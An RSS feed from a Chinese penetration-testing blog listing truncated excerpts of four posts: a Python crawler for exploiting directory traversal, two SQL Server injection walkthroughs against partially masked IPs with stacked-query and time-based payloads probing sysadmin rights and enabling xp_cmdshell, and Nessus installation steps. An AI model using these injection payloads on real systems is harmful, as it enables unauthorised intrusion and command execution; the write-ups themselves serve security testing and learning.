<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pentest on </title>
    <link>https://wyb0.com/tags/pentest/</link>
    <description>Recent content in pentest on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 16 Dec 2019 09:23:47 +0800</lastBuildDate>
    
	<atom:link href="https://wyb0.com/tags/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>目录遍历利用</title>
      <link>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</link>
      <pubDate>Mon, 16 Dec 2019 09:23:47 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</guid>
      <description>0x00 目录遍历 一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看
一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦
而且 eWebEditor、FCKeditor 这种编辑器有些版本也存在目录遍历漏洞，能找的一些未授权访问也是好的
以前写过一个爬网站链接的脚本，感觉可以在那个脚本的基础上改一下，改过后确实大致能用
0x01 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;&#39;&#39; @Author: reber @Mail: reber0ask@qq.com @Date: 2019-08-05 15:58:38 @LastEditTime: 2019-12-16 17:07:09 &#39;&#39;&#39; import asyncio import aiohttp from lxml import etree from urllib.parse import urljoin from urllib.parse import urlparse from urllib.parse import urlunsplit from pybloom_live import BloomFilter bf = BloomFilter(100000, 0.01) def is_repeat(ele): if ele in bf: return True #元素不一定在集合中 else: bf.add(ele) return False #元素一定不在集合中 class GetAllLink(object): &amp;quot;&amp;quot;&amp;quot;docstring for GetAllLink&amp;quot;&amp;quot;&amp;quot; def __init__(self, target, crawl_deepth, rate): super(GetAllLink, self).</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 远程连接桌面</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link>
      <pubDate>Tue, 25 Jun 2019 17:01:53 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid>
      <description>0x00 目标情况  只有一个登录框  0x01 发现注入 简单看了下登陆框，可以爆破用户名
加单引号后报错，试了试 and 1=1 确实存在注入
0x01 进一步测试 尝试得到数据版本: admin&#39; and @@version=1-- 抓包 sqlmap 跑了下发现不行: sqlmap -r 1.txt --risk 3 --level 3 --dbms &amp;quot;Microsoft SQL Server&amp;quot; --second-order &amp;quot;http://123.xxx.xxx.180:2001/error.aspx&amp;quot;
返回: all tested parameters appear to be not injectable，跑不出来，只能手工了
看下能不能多语句执行: admin&#39;;select convert(int,(select user));--
结果发现可以执行成功，能进行多语句执行 0x02 尝试多语句执行添加用户  查看是否有 xp_cmdshell
Payload：admin&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:5&#39;;--  开启 xp_cmdshell</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&amp;lt;也可用sqlmap的&amp;ndash;is-dba判断&amp;gt;)  uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--   查看是否有xp_cmdshell  uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.</description>
    </item>
    
    <item>
      <title>Nessus 的安装和卸载</title>
      <link>https://wyb0.com/posts/2016/nessus-install-and-remove/</link>
      <pubDate>Wed, 11 May 2016 17:09:10 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/nessus-install-and-remove/</guid>
      <description>0x00 下载 Nessus 的 deb 安装包 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装 Nessus 0x02 执行后续安装步骤:  启动nessus  web访问nessus服务  设置账户和密码  申请code，可以在【这里】申请  去邮箱查找code  将code填入，然后等待插件的下载   0x03 登陆 Nessus 0x03 卸载 Nessus https://docs.tenable.com/nessus/Content/RemoveNessus.htm</description>
    </item>
    
  </channel>
</rss>